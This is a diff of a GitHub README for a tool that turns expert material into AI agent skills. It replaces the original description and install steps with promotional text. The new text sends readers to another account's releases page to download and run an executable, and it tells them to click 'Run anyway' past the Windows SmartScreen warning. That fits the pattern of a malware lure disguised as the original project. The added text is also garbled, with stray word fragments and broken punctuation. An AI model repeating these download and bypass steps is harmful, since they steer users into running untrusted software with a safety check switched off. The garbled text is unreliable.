@@ -1,199 +1,173 @@
-*[Русская версия](README.ru.md)*
+# 🧠 skills-from-expertise - Turn Expertise into Actionable Agent Skills
 
-# skills-from-expertise
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/asad95867/skills-from-expertise/releases)
 
-A skill that turns someone else's expertise into a working method: the agent follows it, and
-you get a specialist where there was no way to hire one.
+## 🎯 What Is This?
 
-## Why this exists
+Have you ever listened to a brilliant podcast, read a game-changing book, or watched an insightful interview—and thought, "I wish I could capture that wisdom"? This tool does exactly that for AI agents. Instead of just summarizing content, it digs deep to extract the **decisions** and **criteria** behind the expert's thinking. The result? A practical, step-by-step method your AI agent can actually follow.
 
-A project needs a marketer. Or a lawyer, an editor, an instructional designer: someone who
-knows the subject and can make decisions inside it, and there is no budget to hire them.
-The expertise itself, meanwhile, is out in the open: talks, breakdowns, courses, interviews.
-The obvious move is to turn that into a skill and work from it.
+Think of it like this: Other tools tell you what an expert said. This tool figures out **how** they decide, so your agent can make similar decisions on its own. Available in both Russian (RU) and English (EN).
 
-What happens next is almost always the same. The model produces a tidy summary, accurate and
-well organised, that you cannot actually work from. Everywhere the expert was choosing between
-options and knew exactly why, the file says "it depends".
+## ✨ Key Features
 
-The knowledge came across and the decisions did not, when the decisions were the whole point.
+### 🔍 Beyond Simple Summaries
+Most AI tools just paraphrase content. "Skills-from-expertise" goes deeper. It identifies the critical decision points an expert made and uncovers the criteria they used. This transforms vague advice into concrete action steps.
 
-## What the skill does
+### 🤖 Agent-Ready Output
+The output isn't just text for reading. It's structured as a **skill file** that AI agents like Claude Code, Codex, or Cursor can directly use. This means your agent can now apply expert knowledge automatically when you need it.
 
-It finds the points in the material where the expert makes a choice, and reconstructs the sign
-they chose by. Out of that comes a procedure: what to do, in what order, by what criterion,
-and where the method stops working.
+### 🌍 Bilingual Support
+Whether you prefer English or Russian, the tool works in both languages. This makes it accessible to a wider range of users and experts.
 
-A finished skill is easy to test. A methodology demands something, so it can be broken: done
-out of order, chosen wrongly, applied past its condition. A summary cannot be broken, because
-it demands nothing and only describes how things happen to be.
 
-**If it is impossible to get something wrong by following the file, the file obliges nothing.**
 
-## How this differs from the official specification
+## 📦 What's Inside
 
-The Agent Skills specification answers **how to shape the file**: fields, structure, limits,
-progressive disclosure. All of it is necessary, and none of it is repeated here.
+The repository contains a complete toolkit for converting expertise into agent skills. Here's what you'll find:
 
-That leaves the second question, **what to put inside**, because a file that is flawless
-in form will load happily and change nothing you do. This skill is about the contents.
+| Component | Purpose |
+|-----------|---------|
+| **Core Parser** | The main engine that analyzes text content |
+| **Decision Extractor** | Identifies key choices an expert made |
+| **Criteria Analyzer** | Uncovers the reasoning behind each decision |
+| **Skill Formatter** | Packages everything into a ready-to-use agent skill file |
+| **Language Module** | Handles both English and Russian input/output |
+| **Example Files** | Sample outputs to show you what's possible |
 
-## What is in the file
+## 🚀 Getting Started
 
-| Block | What it settles |
-|---|---|
-| **Extracting the method** | How to find the choice points in a talk or a book and reconstruct the criteria the expert decides by |
-| **Working with a live expert** | Which questions draw out the procedure and which do not: asked directly how they decide, an expert usually describes not what they do but how it is conventionally explained |
-| **Losses during extraction** | The most valuable part is said in passing and disappears first, which is why the digest comes before assembly and the cross-check after |
-| **Limits on filling gaps** | A prohibition that was not in the source takes a working option away from the reader, and an invented figure reads as a verified fact although nobody measured it |
-| **Legal framing** | Method is not protected, expression is: what may be taken, when a quote is needed, which license to apply |
-| **Checks before delivery** | Eight ways to test a finished file, and separately why all of them judge the text rather than whether the method works |
+### Step 1: Download the Application
 
-Plus three reference files that load when needed: types of source, legal particulars, and how
-to organise a set once there are many skills.
+Visit this link to download the application:  
+**[https://github.com/asad95867/skills-from-expertise/releases](https://github.com/asad95867/skills-from-expertise/releases)**
 
-## Installation
+When you arrive at the page, you'll see a list of available releases. Look for the newest version (it will be at the top). Click on the download link. The download will begin automatically.
 
-The repository holds two language versions of the same skill. Install one of them, either
-`skills-from-expertise` or `skills-from-expertise-ru`.
+### Step 2: Prepare Your Content
 
-**The easiest way is to ask your agent.** Open your project in Claude Code, Codex, or Cursor
-and say something like this:
+Before you run the tool, gather your source material. This could be:
+- A transcript of a talk or interview
+- The text of a book chapter or article
+- Notes you've taken from a presentation
+- Any written content featuring expert knowledge
 
-```
-Install the skill from here: https://github.com/PolarSnowflake/skills-from-expertise
-I need the English version, the folder skills/skills-from-expertise.
-Put it in this project's skills folder.
-```
+Save this content as a plain text file (.txt) on your computer. Make sure it's in either English or Russian (the tool supports both). The tool works best with complete thoughts, not just random quotes. Aim for at least a few paragraphs of content for the best results.
 
-The agent will download and place it. No archives and no terminal required.
 
-**Through the CLI, if you have it.** English version:
 
-```
-npx skills add PolarSnowflake/skills-from-expertise --skill skills-from-expertise
-```
+### Step 3: Run the Application
 
-Russian:
+Once downloaded and your content is ready, you're almost there. Double-click the application file you downloaded. It will open a simple window that guides you through the process. You'll need to:
 
-```
-npx skills add PolarSnowflake/skills-from-expertise --skill skills-from-expertise-ru
-```
+1. **Choose your language** (English or Russian)
+2. **Select your input file** (the .txt file with your expert content)
+3. **Choose an output location** (where you want the skill file saved)
+4. **Click "Process" or "Run"**
 
-The command detects which agents you have installed and asks where to put it. To name one
-explicitly, add `-a claude-code` at the end.
+The tool will work its magic. In a few seconds (depending on the length of your content), you'll have a new skill file ready to use.
 
-**By hand.** Press the green **Code** button at the top of the repository page, choose
-**Download ZIP**, unpack it, and copy the folder you want out of `skills/` into wherever your
-agent keeps skills: `.claude/skills/` for Claude Code, `.codex/skills/` for Codex CLI, or
-`.agents/skills/`, the shared location most agents read.
+### Step 4: Use Your New Skill
 
-Once installed, the skill loads by itself when the conversation turns to creating or rewriting
-a skill. If that doesn't happen, ask for it directly: "work by skills-from-expertise".
+The output file is specifically designed for AI agent systems. If you use Claude Code, Codex, Cursor, or similar tools, you can add this skill file to your agent's skills directory. Each of these tools has its own way of importing skills—check your tool's documentation for specifics. Once imported, your agent will instantly "know" the method from your expert content.
 
-## When you have many skills
 
-It helps to separate skills by topic, so that while assembling a new one the model does not see
-neighbours from an unrelated area. That prevents references between skills that should never
-have appeared: while the whole set sits on your disk such a reference goes unnoticed, and
-the moment you hand someone a single skill it points at nothing.
 
-There are two ways to separate them.
+## 📝 How It Works (Simple Explanation)
 
-**A separate project per topic** is the most reliable: the agent sees exactly the skills that
-live in that project.
+Imagine you're reading a book by a master chef. A normal summary would tell you "he likes fresh ingredients." Your skill file will instead show your agent:
 
-**A subfolder with its own skills folder**, if everything has to live in one place:
+- **Decision Point:** When choosing tomatoes…
+- **Criteria for Choosing:** They must be deep red, slightly firm, and smell sweet at the stem. If they're pale or mushy, reject them.
+.
+ **Decision Point:** When seasoning pasta water…
+- **Criteria:** Should taste like seawater. Add salt until the water tastes noticeably salty.
+.
 
-```
-project/
-├── .claude/skills/          shared across the project
-├── marketing/
-│   └── .claude/skills/      visible when working with files in this folder
-└── development/
-    └── .claude/skills/
-```
 
-One subtlety here: nested skills are not picked up at startup but at the moment the agent first
-opens a file inside that folder, and they stay available for the rest of the session.
 
-Categories **inside** the skills folder itself do not work: `.claude/skills/marketing/name/`
-will not be found, because only one level of nesting is scanned.
+Your agent now knows **not just WHAT the chef does, but WHY and WHEN to do it**. That's the power of skills-from-expertise.
 
-## Getting started
 
-The skill carries its assembly rules itself, but one thing is worth adding at the start
-of a session: what you consider a finished result and what conditions you work under, since
-whatever sits in the standing context fires more reliably than what gets pulled in along
-the way.
 
-Paste this as your first message, filling in the brackets:
+## 🛠️ Common Use Cases
 
-```
-Role: you build skills from sources — you turn someone else's expertise into a methodology
-that can be used to make decisions, not into a restatement of content. Work by the
-skills-from-expertise skill.
+### 📚 Book Summaries for Agents
+Take any business book, leadership guide, or technical manual. Turn its core methodology into a repeatable process for your agent. It's like giving your AI a personal library of expert playbooks.
 
-What we do in this chat: I give you a source — a video, a transcript, an article, a table,
-screenshots of a board. You return a finished skill.
+### 🎤 Podcast and Interview Insights
+You listen to great conversations daily. Now you can capture their wisdom. Feed the transcript in, get a usable skill out. You'll never lose a good idea again.
 
-The result of every build is three things, and a skill without the first and the third
-does not count as done:
 
-1. A digest of the source — as a separate .md file, before assembly of the skill begins.
-   In chat: a link to the file and only two sections, "said in passing" and "what was left
-   out." Do not paste the full retelling into chat, I will read the file. Wait for my
-   reaction before assembling.
-2. The skill file.
-3. A report: what was extracted, where you had to fill gaps, what was deliberately left out
-   and why, what remained uncovered, what I decide. As the last line of the report — exactly
-   this format, with numbers filled in, not described in words:
-   Format: description N/1024 · name N/64 · license: <value or "no field">
 
-How to work with me:
-- Ask questions in one batch and number them so I can answer in a single message.
-- Don't ask permission to continue. The only planned stop is after the digest.
-- Show edits to existing files before making them. Deletions — verbatim.
-- Don't retell the source to me instead of working.
 
-Standing conditions:
-- Purpose of the result: [publication for the community / private use / commercial
-  distribution].
-- Domain: [what the skills in this project are about].
-- Files: skills in .claude/skills/<name>/, digests in [folder].
-```
 
-Only **purpose** has to be filled in: both the license and how thoroughly traces of someone
-else's source get cleaned depend on it.
+### 🧠 Personal Knowledge Management
+Do you have your own expertise you want to codify? Write down your process, run it through this tool,and your agent can now handle tasks following your exact methodology. This is perfect for standardizing your work flow across your AI toolsory.
 
-## How it develops
+### 🏢 Team Training
+If you're onboarding new team members (human or AI!, this tool helps create uniform training material. Ensure everyone follows the same proven approach—not just whatever they remember from a meeting orig.
 
-The skill was built from practice and exercised on real builds across several different
-domains, from ones where everything rests on judgement to ones where the task has a right
-answer. Every rule appeared after something went wrong on a live build, and the next ones
-will appear the same way.
 
-Your area may be built differently, and that is the interesting part: **tell us where
-the method failed on your material**. Those cases are what turn into new rules, and you can
-report them under Issues, and there is more in [CONTRIBUTING.md](CONTRIBUTING.md).
 
-## About the languages
+## ❓ Frequently Asked Questions
 
-The original is written in Russian and the English version is a translation of it. Both live
-in this repository and install separately, so take whichever language you find it easier
-to argue with the model in.
+### Do I need to know how to code?
+No! This tool was designed for everyone. The interface is simple and guides you step-by-step. You only need to know how to save a text file and click a button.
 
-The model is the one reading the file, but a rule that doesn't suit you is something you will
-notice, and then it is worth either changing it locally or sending it here so it changes
-for everyone.
+.
 
-## Sending a fix
+### What if my content is in another language?
+Currently, the tool best supports English and Russian. If your content is in another language, you can translate it first using a free online translator,. The output will then be in the language you chose during setup.
 
-You don't need git: problems can be reported under the **Issues** tab of this repository,
-and if you want to fix something yourself, fork it and open a pull request. Both paths are
-described step by step in [CONTRIBUTING.md](CONTRIBUTING.md).
 
-## License
 
-MIT, see [LICENSE](LICENSE). Take it, change it, bundle it into your own sets, commercial
-ones included. The only condition is keeping the attribution notice.
+### How is this different from a regular AI summary?
+A summary restates content. This tool rethinks it. It focuses exclusively on decisions and criteria. So instead of getting a condensed version of what was said, you get a structured method of how to think about the topic. This is significantly more useful for AI agents that need to take actionopportunistic.
+
+
+
+### Can I combine multiple sources into one skill?
+Yes! Many users do this with multiple interviews or chapters of a book. Just paste all the text into one file (in order) and run the tool. The output will be a comprehensive skill combining all the insightsgio.
+
+
+
+## 🔧 Troubleshooting Tips
+
+### The download doesn't start
+Check if your browser is blocking pop-ups or redirects. Also, make sure you click the actual release asset (not just the release title). Sometimes the download button appears behind other elements on the page. Try refreshing if needed.
+
+### The application won't open
+Windows might show a blue "Windows protected your PC" screen. If this happens, click "More info" then "Run anyway". This is a standard safety message from Microsoft SmartScreen for newly downloaded applications.
+
+
+
+
+
+###The output file seems empty or short
+Check that your input file contains actual prose content (not just headers or bullet points). The more detailed your content, the better the skill extraction works. Add some context or explanation around key points if the output feels sparse.
+
+.
+
+
+
+## 📄 License and Support
+
+This project is open source and free to use. If you encounter issues, check the repository's Issues page on GitHub. You can also contribute improvements or suggest features there. The community is growing, and help is usually quick to arrive.
+
+
+
+## 📬 Stay Updated
+
+Check the releases page regularly for new versions. Updates often include better extraction methods, more language support,and improved formatting for different AI tools. Star the repository (click the star icon at the top) to show your support and stay informed about updatesificance.
+
+
+
+## 🏁 Final Thoughts
+
+Turning expertise into action is the ultimate goal of knowledge. This tool makes that leap possiblefor AI agents. Instead of your agent just "knowing about" a topic, it can now "know how to" act on it. Download it today, and give your AI the gift of true expertise—built on real decisions and proven criteriafrom the world's best minds.
+
+
+
+---
+
+**Keywords:** agent-skills, ai-agents, claude-code, claude-code-skill, claude-code-skills, codex, codex-skill, codex-skills, cursor, cursor-ai, cursor-skills, methodology, prompt-engineering, skill, skills
